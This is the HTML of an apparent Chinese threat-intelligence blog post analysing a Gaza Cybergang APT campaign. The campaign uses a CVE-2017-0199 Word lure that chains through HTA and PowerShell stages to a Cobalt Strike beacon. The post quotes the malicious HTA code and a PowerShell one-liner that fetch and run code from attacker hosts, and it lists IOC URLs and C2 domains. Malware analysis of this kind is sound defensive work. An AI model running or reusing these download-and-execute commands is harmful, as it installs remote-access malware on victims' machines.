<!DOCTYPE html><html data-n-head="" data-n-head-ssr><meta data-n-head="true" charset="utf-8"><meta data-n-head="true" content="width=device-width,initial-scale=1" name="viewport"><meta data-n-head="true" content="Nuxt.js project" name="description" data-hid="description"><title data-n-head="true">360威胁情报中心</title><link href="/fav.ico" rel="icon" data-n-head="true" type="image/x-icon"><link href="/_nuxt/manifest.38f62477280dcc27df9e.js" rel="preload" as="script"><link href="/_nuxt/vendor.bundle.45eca4dc7fa9e1bc4361.js" rel="preload" as="script"><link href="/_nuxt/nuxt.bundle.8e9d53f64bed77ebfe81.js" rel="preload" as="script"><link href="/_nuxt/0.nuxt.bundle.2f45ca512d92831b456d.js" rel="prefetch"><link href="/_nuxt/1.nuxt.bundle.ddf9ea85dc483e3df228.js" rel="prefetch"><link href="/_nuxt/2.nuxt.bundle.ae682d6568221e03d161.js" rel="prefetch"><link href="/_nuxt/3.nuxt.bundle.55fb549cb8ff45291a32.js" rel="prefetch"><link href="/_nuxt/4.nuxt.bundle.34c699b301359d6a3c4d.js" rel="prefetch"><link href="/_nuxt/5.nuxt.bundle.1375829ca49ba88d696d.js" rel="prefetch"><style data-vue-ssr-id="1cbf7f39:0 198c0e1e:0 034fd8e0:0 ba3a09e0:0 c2ba7178:0 01cb4693:0 69b5e360:0">.progress[data-v-862bdd9c]{position:fixed;top:0;left:0;right:0;height:2px;width:0;-webkit-transition:width .2s,opacity .4s;-o-transition:width .2s,opacity .4s;transition:width .2s,opacity .4s;opacity:1;background-color:#efc14e;z-index:999999}.hljs ::-webkit-scrollbar{width:8px;height:10px;border-radius:2px;background-color:#839496}.hljs ::-webkit-scrollbar-track{background-color:#bebebe}.hljs ::-webkit-scrollbar-thumb,.hljs ::-webkit-scrollbar-track{border-radius:2px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3)}.hljs ::-webkit-scrollbar-thumb{background-color:#789}html{font-family:Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;font-size:16px;word-spacing:1px;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;-webkit-box-sizing:border-box;box-sizing:border-box}body{background-color:rgba(66,66,66,.05)}*,:after,:before{-webkit-box-sizing:border-box;box-sizing:border-box;margin:0;text-decoration:none}li{list-style-type:none}a:active,a:hover,a:link,a:visited{color:#0b1802}.main-body h1,.main-body h2,.main-body h3,.main-body h4,.main-body h5,.main-body h6{margin-top:0;margin-bottom:.5rem}.main-body p{margin-top:0;margin-bottom:1rem;font-size:15px;text-indent:25px;word-wrap:break-word}.main-body img{vertical-align:middle;border-style:none;margin:auto 20px auto auto;padding:3px;border-radius:3px;background-color:#e6e6d5;-webkit-box-shadow:0 1px 2px rgba(0,0,0,.15);box-shadow:0 1px 2px rgba(0,0,0,.15);border:1px solid #b9baa6}.main-body .text-center{text-align:center!important}.main-body table{border-collapse:collapse!important;width:100%;max-width:100%;margin:1em 0;background-color:transparent}.main-body table tbody+tbody{border-top:2px solid #e9ecef}.main-body table td,.main-body table th{padding:.5rem;font-size:.95em;border-collapse:collapse}.main-body table tr{border:1px solid #dfe8fe}.main-body table tr:nth-child(odd){background-color:#ecf1fe}.main-body table tr:nth-child(2n){background-color:#fdfdfd}.main-body table td{white-space:normal;word-break:break-all}.main-body code,.main-body kbd,.main-body pre,.main-body samp{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.nav-bar[data-v-42857612]{height:60px;border-bottom:1px solid #d5d5d5}.nav-bar .ico-favicon[data-v-42857612]{height:28px;margin-top:16px;margin-left:108px;cursor:pointer}.nav-bar .ico-home[data-v-42857612]{width:32px;height:32px;display:inline-block;margin:16px 32px;float:right;cursor:pointer;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACU0lEQVRYR+2XzZHaQBCFX48cAM4AStxNBmYzACSfDREYIjAbAcoA9mwkcARmM1jfocAZbADWPNfIDAtaCUmUXdhV6Cjm5+vX3Y+W4MqPXPl+XAzQWWxrSuvPJgCt1P2y23i+JJiLADqLbcuJ9RSCVnIp8RQ7arDsNp6qQlQG6IXrPiATIYTCoblQKAEFBDiKvOasCkRpgL3kEwH6BL5rpfo2YqOI0nomwDsCM63UqGxKSgGcSE4+xI4zTF9gAJ04DiDysUpKCgHSkhdJbNZXSUkuQJ7k+0inFHmMPDfIync6JZHnDvLqIhOgs9jWnVgvkio/kvxwMDkO/ebyXLFlpKS77DZ26T2vALz5ukORqQA1ggMreS/cmIrva6U6WQflwZh9AkwIPAs5SIOfAHjzTQDBJ3tY6LliJQfkR+i7SdtVfXrhZixAYloEgshzR/aMA0AvXK8E8h7kV4rUTUsZALMZ4K6o+M5BWQDTvuZckKvQb94lHmI3mugp2JnCsjAWQGm1mn9orKpGbtdbANHqTivdEqJu1cwswr8JkA7kBlCogOmCsr5+phWTLjA18P+lwP+ybf98g501nxdfQC0r4thxzD/hyVxw3AWVFUhfYp0ttyXJh9Bv9o9//9MAufn0wg0JPkZes30DuCnwTyoQK/U2bWqZTniYC8hueoA411L5XbBeCaUV+u4r78gEMOZDpb/Zjw6Ah6+e/axQN5Pv8ftkrUh7P/kcjIgird/TFe4jzx0XjmR2QQIh8ZCS7XhlZwMhDPwsb4YsHMvLXnTpuqsD/AKIkSQ/Gqk/IAAAAABJRU5ErkJggg==) no-repeat}.nav-bar .ico-home[data-v-42857612]:hover{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACRElEQVRYR+2XT5LSQBTGvy9B13gDbmBuIJSJ65kTGKqEciecQOYEsJxKrII5gboVLJgbzNwAb8Aah7ypjmnMNPlLaaFV9DLV3e/3vvcnr4kTL57YPo4G8JfSfP6Aj8qBbQNXsw43xzhzFEDvmzggpiQcZVQEdxB0wze8qwtRG6D3XXwIxhRQLAyUQUaYCCEghuFrzupAVAZQkj/bYUzAB3AvEXztsVKEFpThlwLMftoYVg1JJQBD8putjYFpIM6JHSYA3tYJSSmAKXmZxGp/nZDkAuRJnng6heA28Kg8PlhmSEKX3by8yAR4v5TW7gGfkyzfS566eBS4/FKUbGZI7AYurztcm2cOAPoLuRBgSqApRFdL3p/LAIRv2bjIuigPJjk3FmBDoGuCPwHoLWRC4IO+LHBJLbkAP0KXcdnVXf25jMBfTQuCSeBxqO/YA/TmsiLxSgRfSbRUSSkAdVgsrMuSrwgqBXCflOoqdNmJe4g+GHsvWKvE0jAaIAJWnzyu6nqu92uASNCxAEeIllYzMwn/JoDpyBmgVAFVBVX7ekEpxlWgcuD/C8G7ubQbDax180n1hWamxxGG5lyQroLaCphGdGcrKMmbwKX6Ze/XnwbIjWd/ISKC29Bj+wxwVuCfVGBr44XZ1LI74e+54NIcIIpKKq8K4p8b4AQeD3pHJoBqPhaxjOcH9egg9q8eIp4VWub35N/eVpMPgPQDxVHTFQRXgcdR6UimNygIIn54ZHe86sPBhsQsb4YsHcur2zlu58kBHgGcWwk/vbbC3wAAAABJRU5ErkJggg==) no-repeat}.disPic .pic[data-v-42857612]{background-color:#faa732;height:480px;width:100%}.article-page[data-v-8db87e62]{margin:0 auto;max-width:1108px;background-size:cover}.article-page .page-header[data-v-8db87e62]{border-bottom:1px solid #efefef}.article-page .page-header .ava img[data-v-8db87e62]{border-radius:50%;height:56px;width:56px;float:left;margin:12px}.article-page .page-header .title[data-v-8db87e62]{font-size:48px;color:#0b1802;font-family:"Verdana, \5FAE\8F6F\96C5\9ED1, \5B8B\4F53, Geneva, 'sans-serif'"}.article-page .page-header .author[data-v-8db87e62]{display:inline-block;color:#979996;font-size:16px;font-family:"Verdana, \5FAE\8F6F\96C5\9ED1, \5B8B\4F53, Geneva, 'sans-serif'";margin:12px 7px 12px 0;line-height:16px}.article-page .page-header .author .ico-time img[data-v-8db87e62]{width:16px;height:16px}.article-page .main-body[data-v-8db87e62]{padding:0 108px;margin:28px auto 168px;background:url(/_nuxt/img/post-entry-bg.98216ca.png) no-repeat -10px 9px}.article-page .back-top[data-v-8db87e62]{width:48px;height:48px;position:fixed;bottom:30px;right:20px;background:url(/_nuxt/img/top.1d1a857.png) no-repeat}.article-page .back-top[data-v-8db87e62]:hover{cursor:pointer;background:url(/_nuxt/img/top-light.0cd636b.png) no-repeat}.title-home[data-v-552f8598]{font-family:sans-serif;line-height:32px;font-size:24px;color:#0b1802;cursor:pointer;max-height:32px;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis}.title-home[data-v-552f8598]:hover{text-shadow:2px 3px 1px #d0d0d0}.title-detail[data-v-552f8598]{font-size:48px;color:#0b1802;font-family:Arial Rounded MT Bold;margin-top:48px;line-height:64px}@media screen and (min-width:550px) and (max-width:950px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}@media screen and (max-width:550px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}.tags[data-v-53a17526]{height:42px;padding-top:10px}.tag[data-v-53a17526]{background-color:#6aacd8;display:inline-block;height:22px;font-size:13px;color:#fefefe;font-family:sans-serif;padding:2px 6px;margin-right:8px;border-radius:2px}</style><body data-n-head=""><div data-server-rendered="true" id="__nuxt"><div class="progress" data-v-862bdd9c style="width:0%;height:2px;background-color:#3b8070;opacity:0"></div><div><section><div data-v-42857612><div class="nav-bar" data-v-42857612><a href="/" data-v-42857612><img src="/_nuxt/img/blog-icon.f80549d.png" class="ico-favicon" data-v-42857612></a><div class="ico-home" data-v-42857612></div></div><!----></div><div class="article-page" data-v-8db87e62><div class="page-header" data-v-8db87e62><div class="title-detail" data-v-552f8598 data-v-8db87e62>Gaza Cybergang APT团伙新样本分析</div><div class="ava" data-v-8db87e62><img data-v-8db87e62></div><div class="tags" data-v-53a17526 data-v-8db87e62><p class="tag" data-v-53a17526>APT<p class="tag" data-v-53a17526>GAZA</div><div class="author lh32" data-v-8db87e62>黄朝文 on</div></div><div class="main-body" data-v-8db87e62><h2 class="line" data-line="0">事件背景</h2><p class="line" data-line="2">2017年6月下旬， 360威胁情报中心发现了Gaza Cybergang APT事件的新样本，其特点是恶意代码完全使用网上流行的标准攻击框架Cobalt Strike生成，配合CVE-2017-0199漏洞通过鱼叉邮件投递，本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。<h2 class="line" data-line="4">样本分析</h2><table><thead><tr><th><th><tbody><tr><td><strong>Hash</strong><td>004ef1209458bf6056147d1ce001fe9d<tr><td><strong>文件类型</strong><td>Word文档<tr><td><strong>文件大小</strong><td>2.5 MB (2592858 bytes)<tr><td><strong>文件名</strong><td>رارات اللجنة المركزية.doc （中央委员会的决定.doc）</table><p class="line" data-line="13">该文档所利用的漏洞为CVE-2017-0199，该漏洞利用OFFICE OLE对象链接技术，将包裹的恶意链接对象嵌在文档中，OFFICE调用<a href="https://msdn.microsoft.com/en-us/library/ms775149%28v=vs.85%29.aspx">URL Moniker</a>（COM对象）将恶意链接指向的HTA文件下载到本地， <a href="https://msdn.microsoft.com/en-us/library/ms775149%28v=vs.85%29.aspx">URL Moniker</a>通过识别响应头中content-type的字段信息最后调用mshta.exe将下载到的HTA文件执行起来。<p class="text-center line" data-line="15"><img src="/uploads/2017/07/25/2c6c046e1469061df944b8d6b626a9e8.png" alt="" width="90%"><p class="line" data-line="17">可以看到下载地址为http://138[.]68.242.68:820/word.hta<p class="line" data-line="19">Hta的代码如下：<pre class="hljs"><code class="hljs">a=new ActiveXObject('WScript.Shell');

a.run('%windir%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString(\'https://gist.githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1\')"', 0, true);

window.close();
</code></pre><p class="line" data-line="29">其会启用powershell去下载:<p class="line" data-line="31">https://gist[.]githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1<p class="line" data-line="33">1.ps1其实也是一个downloader,从https://drive[.]google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU下载一个PE文件并保存为%appdata%目录下的ps.exe。<pre class="hljs"><code class="hljs">powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU',"$env:APPDATA\ps.exe"\);Start-Process ("$env:APPDATA\ps.exe")
</code></pre><p class="line" data-line="39">ps.exe是一个sfx文件，解压出来notepad.exe是一个dropper，其会在temp目录释放一个powershell脚本，然后以<code>"C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" -noProfile -ExecutionPolicy Bypass -File "C:\Documents and Settings\Administrator\Local Settings\Temp\3A.tmp\3B.ps1"</code>执行该脚本。<p class="text-center line" data-line="41"><img src="/uploads/2017/07/25/15b019813d9e6141c0e6613cb2a2f14b.png" alt="" width="90%"><p class="line" data-line="43">Powershell脚本的功能也非常简单，将内置的字符串base64decode后，得到一个PE文件（beacon_dll.dll），然后CreateThread一个新线程，将这个dll加载起来。<p class="line" data-line="45">beacon_dll.dll是使用cobalt strike攻击框架生成的标准攻击载荷。其使用了一种叫做Reflective Load的技术，也就是在PE头部插入shellcode并实现一个模拟加载dll的导出函数，在shellcode中调用该导出函数将自身加载进来，并以fdwReason = 4来调用DllMain，这样做的好处有两个：<ol><li>可以直接将dll当成shellcode加载\注入到内存中从MZ头开始执行；<li>正常地加载dll不会执行到功能流程（因为在MSDN中指明了fdwReason的值只能为0、1、2、3）。</ol><p class="line" data-line="50">MZ头部的shellcode如下：<p class="text-center line" data-line="52"><img src="/uploads/2017/07/25/7cdd85072c838392e04111126d73d632.png" alt="" width="90%"><p class="line" data-line="54">实现自加载的导出函数的校验PE头部分代码：<p class="text-center line" data-line="56"><img src="/uploads/2017/07/25/f2a186ca6c79f8af69415eb81d031579.png" alt="" width="90%"><p class="line" data-line="58">DllMain中代码：<p class="text-center line" data-line="60"><img src="/uploads/2017/07/25/82809a34c05d0f327c3bd5b33fd0e99e.png" alt="" width="90%"><p class="line" data-line="62">可以看到，只有在fdwReason == 4时才会进入真正的功能流程，进入该流程后，首先将数据节偏移为 0x2E040，大小为 0x610的数据解密，解密方式是xor 0x69, 解密出的数据中包含了C&C， lol[.]mynetav.org。<p class="text-center line" data-line="64"><img src="/uploads/2017/07/25/0a7801660bd57492afc18b7bfa30ccfc.png" alt=""><p class="line" data-line="66">然后开始连接C&C服务器，这里支持dns_text,http,smb,tcp等多种协议的通信方式：<p class="text-center line" data-line="68"><img src="/uploads/2017/07/25/6b55fb43a9e99442972c250752cda50a.png" alt=""><p class="text-center line" data-line="70"><img src="/uploads/2017/07/25/46b35f1a964950a8beca926fe2de433f.png" alt="" width="90%"><p class="line" data-line="72">最后进入的就是远控功能部分了，由于是Cobalt Strike生成的标准载荷，功能包括显示应用信息、显示机器的凭证信息，文件下载，查看事件日志，键盘记录，获取代理信息，屏幕截图，加载脚本等等..... 具体功能就不再分析了。<h2 class="line" data-line="74">扩展与关联分析</h2><p class="line" data-line="76">使用360威胁情报中心的<a href="http://ti.360.com">威胁情报平台</a>对样本连接的C&C地址（138.68.242.68）做进一步关联，发现了一个新的样本：<p class="text-center line" data-line="78"><img src="/uploads/2017/07/25/eb821528a0dd812e962cb8ca362d4584.png" alt="" width="90%"></p><center><table><thead><tr><th><th><tbody><tr><td><strong>Hash</strong><td>87a67371770fda4c2650564cbb00934d<tr><td><strong>文件类型</strong><td>Word文档<tr><td><strong>文件大小</strong><td>2.5 MB (2592858 bytes)<tr><td><strong>文件名</strong><td>محضر اجتماع مركزية فتح الليلة.doc （中心开幕之夜的会议纪要.doc）</table></center><p class="line" data-line="89">该样本与上面提到的样本几乎完全一致，只是连接的url变成了http://138[.]68.242.68:808/word.hta<p class="line" data-line="91">另外我们发现lol.mynetav.org解析到的ip地址就是138.68.242.68，并且有一个域名<a href="https://www.passivetotal.org/search/ksm5sksm5sksm5s.zzux.com">ksm5sksm5sksm5s.zzux.com</a>也解析到了这个ip上，而<a href="https://www.passivetotal.org/search/ksm5sksm5sksm5s.zzux.com">ksm5sksm5sksm5s.zzux.com</a>这个域名，是Gaza Cybergang攻击事件（Gaza Cybergang APT活动是在2015年9月被Kaspersky公开揭露出来的一个APT组织，最早的活动可以追溯到2012年。相关行动的主要使用的攻击方式：鱼叉邮件，涉及行业：政治，受影响国家：埃及、阿联酋、也门）的其中一个C&C。 综合上面提到的文档标题、内容和来源，我们认为这次事件应该是Gaza Cybergang APT活动的又一次攻击活动。<h2 class="line" data-line="93">IOC</h2><table><thead><tr><th><strong>文件名</strong><tbody><tr><td>محضر اجتماع مركزية فتح الليلة.doc<tr><td>رارات اللجنة المركزية.doc<tr><td>Ps.exe</table><table><thead><tr><th><strong>MD5</strong><tbody><tr><td>87a67371770fda4c2650564cbb00934d<tr><td>004ef1209458bf6056147d1ce001fe9d<tr><td>2b3df594e5d73a95c9f2d820072b067a<tr><td>bfefedb094f40c276bf1ae26b225e310<tr><td>4f3b1a2088e473c7d2373849deb4536f</table><table><thead><tr><th><strong>下载链接</strong><tbody><tr><td>https://doc-0k-2g-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/jft1kksjnhmtb1r0jdudcme1r83f05an/1497996000000/00086189316172082427/*/0B1NUTMCAOKBTdVQzTXlUNHBmZUU?e=download<tr><td>https://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU<tr><td>http://138.68.242.68:820/word.hta<tr><td>http://138.68.242.68:808/word.hta<tr><td>https://gist.githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1<tr><td>http://lol.mynetav.org:3737/ptj</table><table><thead><tr><th><strong>C&C</strong><tbody><tr><td>lol.mynetav.org<tr><td>138.68.242.68</table></div><div class="back-top" data-v-8db87e62></div></div></section></div></div><script type="text/javascript">window.__NUXT__={layout:"default",data:[{articleData:{_id:"597733a71c670a09e493ee37",title:"Gaza Cybergang APT团伙新样本分析",category:"事件追踪",readableId:"gaza-cybergang-apt-sample",abstract:"2017年6月下旬， 360威胁情报中心发现了Gaza Cybergang APT事件的新样本，其特点是恶意代码完全使用网上流行的标准攻击框架Cobalt Strike生成，配合CVE-2017-0199漏洞通过鱼叉邮件投递，本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。",author:"黄朝文",headImg:"/uploads/2017/08/17/13296b2306bed22900c8f2ffd7d3242a.png",descImg:"/uploads/2017/07/31/8102c0ab69bdb893c5c5a0dde724ee80.png",tags:["APT","gaza"],publish_time:"2017-07-27T17:58:36.000Z",content:'<h2 class="line" data-line="0">事件背景</h2>\n<p class="line" data-line="2">2017年6月下旬， 360威胁情报中心发现了Gaza Cybergang APT事件的新样本，其特点是恶意代码完全使用网上流行的标准攻击框架Cobalt Strike生成，配合CVE-2017-0199漏洞通过鱼叉邮件投递，本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。</p>\n<h2 class="line" data-line="4">样本分析</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>004ef1209458bf6056147d1ce001fe9d</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>2.5 MB (2592858 bytes)</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>رارات اللجنة المركزية.doc （中央委员会的决定.doc）</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="13">该文档所利用的漏洞为CVE-2017-0199，该漏洞利用OFFICE OLE对象链接技术，将包裹的恶意链接对象嵌在文档中，OFFICE调用<a href="https://msdn.microsoft.com/en-us/library/ms775149%28v=vs.85%29.aspx">URL Moniker</a>（COM对象）将恶意链接指向的HTA文件下载到本地， <a href="https://msdn.microsoft.com/en-us/library/ms775149%28v=vs.85%29.aspx">URL Moniker</a>通过识别响应头中content-type的字段信息最后调用mshta.exe将下载到的HTA文件执行起来。</p>\n<p class="text-center line" data-line="15"><img src="/uploads/2017/07/25/2c6c046e1469061df944b8d6b626a9e8.png" alt="" width="90%"></p>\n<p class="line" data-line="17">可以看到下载地址为http://138[.]68.242.68:820/word.hta</p>\n<p class="line" data-line="19">Hta的代码如下：</p>\n<pre class="hljs"><code class="hljs">a=new ActiveXObject(\'WScript.Shell\');\n\na.run(\'%windir%\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString(\\\'https://gist.githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1\\\')"\', 0, true);\n\nwindow.close();\n</code></pre>\n<p class="line" data-line="29">其会启用powershell去下载:</p>\n<p class="line" data-line="31">https://gist[.]githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1</p>\n<p class="line" data-line="33">1.ps1其实也是一个downloader,从https://drive[.]google.com/uc?export=download&amp;id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU下载一个PE文件并保存为%appdata%目录下的ps.exe。</p>\n<pre class="hljs"><code class="hljs">powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile(\'https://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU\',"$env:APPDATA\\ps.exe"\\);Start-Process ("$env:APPDATA\\ps.exe")\n</code></pre>\n<p class="line" data-line="39">ps.exe是一个sfx文件，解压出来notepad.exe是一个dropper，其会在temp目录释放一个powershell脚本，然后以<code>&quot;C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe&quot; -noProfile -ExecutionPolicy Bypass -File &quot;C:\\Documents and Settings\\Administrator\\Local Settings\\Temp\\3A.tmp\\3B.ps1&quot;</code>执行该脚本。</p>\n<p class="text-center line" data-line="41"><img src="/uploads/2017/07/25/15b019813d9e6141c0e6613cb2a2f14b.png" alt="" width="90%"></p>\n<p class="line" data-line="43">Powershell脚本的功能也非常简单，将内置的字符串base64decode后，得到一个PE文件（beacon_dll.dll），然后CreateThread一个新线程，将这个dll加载起来。</p>\n<p class="line" data-line="45">beacon_dll.dll是使用cobalt strike攻击框架生成的标准攻击载荷。其使用了一种叫做Reflective Load的技术，也就是在PE头部插入shellcode并实现一个模拟加载dll的导出函数，在shellcode中调用该导出函数将自身加载进来，并以fdwReason = 4来调用DllMain，这样做的好处有两个：</p>\n<ol>\n<li>可以直接将dll当成shellcode加载\\注入到内存中从MZ头开始执行；</li>\n<li>正常地加载dll不会执行到功能流程（因为在MSDN中指明了fdwReason的值只能为0、1、2、3）。</li>\n</ol>\n<p class="line" data-line="50">MZ头部的shellcode如下：</p>\n<p class="text-center line" data-line="52"><img src="/uploads/2017/07/25/7cdd85072c838392e04111126d73d632.png" alt="" width="90%"></p>\n<p class="line" data-line="54">实现自加载的导出函数的校验PE头部分代码：</p>\n<p class="text-center line" data-line="56"><img src="/uploads/2017/07/25/f2a186ca6c79f8af69415eb81d031579.png" alt="" width="90%"></p>\n<p class="line" data-line="58">DllMain中代码：</p>\n<p class="text-center line" data-line="60"><img src="/uploads/2017/07/25/82809a34c05d0f327c3bd5b33fd0e99e.png" alt="" width="90%"></p>\n<p class="line" data-line="62">可以看到，只有在fdwReason == 4时才会进入真正的功能流程，进入该流程后，首先将数据节偏移为 0x2E040，大小为 0x610的数据解密，解密方式是xor 0x69, 解密出的数据中包含了C&amp;C， lol[.]mynetav.org。</p>\n<p class="text-center line" data-line="64"><img src="/uploads/2017/07/25/0a7801660bd57492afc18b7bfa30ccfc.png" alt=""></p>\n<p class="line" data-line="66">然后开始连接C&amp;C服务器，这里支持dns_text,http,smb,tcp等多种协议的通信方式：</p>\n<p class="text-center line" data-line="68"><img src="/uploads/2017/07/25/6b55fb43a9e99442972c250752cda50a.png" alt=""></p>\n<p class="text-center line" data-line="70"><img src="/uploads/2017/07/25/46b35f1a964950a8beca926fe2de433f.png" alt="" width="90%"></p>\n<p class="line" data-line="72">最后进入的就是远控功能部分了，由于是Cobalt Strike生成的标准载荷，功能包括显示应用信息、显示机器的凭证信息，文件下载，查看事件日志，键盘记录，获取代理信息，屏幕截图，加载脚本等等..... 具体功能就不再分析了。</p>\n<h2 class="line" data-line="74">扩展与关联分析</h2>\n<p class="line" data-line="76">使用360威胁情报中心的<a href="http://ti.360.com">威胁情报平台</a>对样本连接的C&amp;C地址（138.68.242.68）做进一步关联，发现了一个新的样本：</p>\n<p class="text-center line" data-line="78"><img src="/uploads/2017/07/25/eb821528a0dd812e962cb8ca362d4584.png" alt="" width="90%"></p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>87a67371770fda4c2650564cbb00934d</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>2.5 MB (2592858 bytes)</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>محضر اجتماع مركزية فتح الليلة.doc （中心开幕之夜的会议纪要.doc）</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="89">该样本与上面提到的样本几乎完全一致，只是连接的url变成了http://138[.]68.242.68:808/word.hta</p>\n<p class="line" data-line="91">另外我们发现lol.mynetav.org解析到的ip地址就是138.68.242.68，并且有一个域名<a href="https://www.passivetotal.org/search/ksm5sksm5sksm5s.zzux.com">ksm5sksm5sksm5s.zzux.com</a>也解析到了这个ip上，而<a href="https://www.passivetotal.org/search/ksm5sksm5sksm5s.zzux.com">ksm5sksm5sksm5s.zzux.com</a>这个域名，是Gaza Cybergang攻击事件（Gaza Cybergang APT活动是在2015年9月被Kaspersky公开揭露出来的一个APT组织，最早的活动可以追溯到2012年。相关行动的主要使用的攻击方式：鱼叉邮件，涉及行业：政治，受影响国家：埃及、阿联酋、也门）的其中一个C&amp;C。 综合上面提到的文档标题、内容和来源，我们认为这次事件应该是Gaza Cybergang APT活动的又一次攻击活动。</p>\n<h2 class="line" data-line="93">IOC</h2>\n<table>\n<thead>\n<tr>\n<th><strong>文件名</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>محضر اجتماع مركزية فتح الليلة.doc</td>\n</tr>\n<tr>\n<td>رارات اللجنة المركزية.doc</td>\n</tr>\n<tr>\n<td>Ps.exe</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>MD5</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>87a67371770fda4c2650564cbb00934d</td>\n</tr>\n<tr>\n<td>004ef1209458bf6056147d1ce001fe9d</td>\n</tr>\n<tr>\n<td>2b3df594e5d73a95c9f2d820072b067a</td>\n</tr>\n<tr>\n<td>bfefedb094f40c276bf1ae26b225e310</td>\n</tr>\n<tr>\n<td>4f3b1a2088e473c7d2373849deb4536f</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>下载链接</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>https://doc-0k-2g-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/jft1kksjnhmtb1r0jdudcme1r83f05an/1497996000000/00086189316172082427/*/0B1NUTMCAOKBTdVQzTXlUNHBmZUU?e=download</td>\n</tr>\n<tr>\n<td>https://drive.google.com/uc?export=download&amp;id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU</td>\n</tr>\n<tr>\n<td>http://138.68.242.68:820/word.hta</td>\n</tr>\n<tr>\n<td>http://138.68.242.68:808/word.hta</td>\n</tr>\n<tr>\n<td>https://gist.githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1</td>\n</tr>\n<tr>\n<td>http://lol.mynetav.org:3737/ptj</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>C&amp;C</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>lol.mynetav.org</td>\n</tr>\n<tr>\n<td>138.68.242.68</td>\n</tr>\n</tbody>\n</table>\n'}}],error:null,state:{pageId:[],tagParam:[],isMainPage:!1,pageNum:[1,2],articleData:{_id:"597733a71c670a09e493ee37",title:"Gaza Cybergang APT团伙新样本分析",category:"事件追踪",readableId:"gaza-cybergang-apt-sample",abstract:"2017年6月下旬， 360威胁情报中心发现了Gaza Cybergang APT事件的新样本，其特点是恶意代码完全使用网上流行的标准攻击框架Cobalt Strike生成，配合CVE-2017-0199漏洞通过鱼叉邮件投递，本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。",author:"黄朝文",headImg:"/uploads/2017/08/17/13296b2306bed22900c8f2ffd7d3242a.png",descImg:"/uploads/2017/07/31/8102c0ab69bdb893c5c5a0dde724ee80.png",tags:["APT","gaza"],publish_time:"2017-07-27T17:58:36.000Z",content:'<h2 class="line" data-line="0">事件背景</h2>\n<p class="line" 